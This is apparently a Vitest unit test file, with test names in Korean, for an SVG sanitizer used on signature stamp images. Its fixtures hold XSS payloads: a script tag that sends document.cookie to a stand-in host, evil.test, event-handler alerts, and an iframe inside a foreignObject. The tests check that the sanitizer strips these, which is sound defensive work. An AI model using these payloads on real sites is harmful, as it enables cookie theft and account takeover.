import { describe, it, expect } from "vitest";
import { sanitizeStampSvg } from "@/lib/stamp-svg";

// sign-generator 가 만드는 직인과 유사한 정상 SVG
const NORMAL_STAMP = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120"><circle cx="60" cy="60" r="55" fill="none" stroke="#C0392B"/><text x="60" y="70" fill="#C0392B">홍길동</text></svg>`;

describe("sanitizeStampSvg", () => {
  it("script 태그를 제거한다", () => {
    const evil = `<svg width="120" height="120"><script>document.location='https://evil.test/'+document.cookie</script><text>홍</text></svg>`;
    const out = sanitizeStampSvg(evil);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil.test");
  });

  it("이벤트 핸들러 속성(onload 등)을 제거한다", () => {
    const evil = `<svg width="120" height="120"><image href="x" onerror="alert(1)"/><circle onload="alert(1)" r="5"/></svg>`;
    const out = sanitizeStampSvg(evil);
    expect(out).not.toContain("onerror");
    expect(out).not.toContain("onload");
  });

  it("foreignObject 를 제거한다", () => {
    const evil = `<svg width="120" height="120"><foreignObject><iframe src="https://evil.test"></iframe></foreignObject></svg>`;
    const out = sanitizeStampSvg(evil);
    expect(out).not.toContain("foreignObject");
    expect(out).not.toContain("iframe");
  });

  it("정상 직인 SVG 의 도형/텍스트를 보존한다", () => {
    const out = sanitizeStampSvg(NORMAL_STAMP);
    expect(out).toContain("<circle");
    expect(out).toContain("홍길동");
  });

  it("viewBox 가 없으면 width/height 로 보정한다 (기존 normalize 동작 유지)", () => {
    const out = sanitizeStampSvg(NORMAL_STAMP);
    expect(out).toContain('viewBox="0 0 120 120"');
  });

  it("null/빈 입력은 빈 문자열을 반환한다", () => {
    expect(sanitizeStampSvg(null)).toBe("");
    expect(sanitizeStampSvg(undefined)).toBe("");
    expect(sanitizeStampSvg("")).toBe("");
  });
});
